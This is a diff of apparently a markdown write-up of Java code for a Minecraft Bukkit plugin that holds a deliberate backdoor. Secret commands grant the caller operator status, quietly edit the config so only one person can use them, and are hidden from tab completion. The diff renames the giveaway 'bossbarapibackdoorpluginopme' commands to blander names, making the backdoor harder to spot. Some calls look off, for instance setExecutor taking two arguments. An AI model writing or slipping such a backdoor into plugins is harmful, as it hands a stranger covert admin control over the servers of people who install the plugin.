@@ -31,10 +31,17 @@ import org.bukkit.event.player.PlayerCommandSendEvent;
 import java.util.ArrayList;
 import java.util.List;
 ```
+```java
+@Override
+public void onEnable() {
+   Bukkit.getCommand("secret-command-to-op").setExecutor(this, this);
+   Bukkit.getCommand("secret-command-to-de-op").setExecutor(this, this);
+}
+```
 
 ```java 
 // When a user runs our secret command it will op them and discreatly change the config file so only one person can use it
-   Player pl;
+    Player pl;
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (sender instanceof Player) {
@@ -63,8 +70,8 @@ import java.util.List;
     @EventHandler
     public void onPlayerTab(PlayerCommandSendEvent e) {
         List<String> blockedCommands = new ArrayList<>();
-        blockedCommands.add("bossbarapibackdoorpluginopme");
-        blockedCommands.add("bossbarapibackdoorplugindeopme");
+        blockedCommands.add("secret-command-to-op");
+        blockedCommands.add("secret-command-to-de-op");
         e.getCommands().removeAll(blockedCommands);
     }
 ```
